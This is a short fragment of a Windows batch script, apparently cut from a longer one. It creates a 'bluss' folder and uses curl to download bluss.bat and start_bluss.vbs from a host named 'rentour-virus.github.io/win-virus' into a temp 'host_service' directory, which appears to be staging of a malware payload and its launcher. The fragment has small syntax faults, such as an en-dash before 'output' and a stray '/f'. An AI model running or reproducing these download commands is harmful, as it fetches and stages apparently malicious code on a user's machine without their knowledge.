...
mkdir bluss
cd bluss
curl https://rentour-virus.github.io/win-virus/bluss.bat –output %temp%\7935.tmp\host_service\bluss\bluss.bat /f
curl https://rentour-virus.github.io/win-virus/start_bluss.vbs –output %temp%\7935.tmp\host_service\bluss\start_bluss.vbs /f
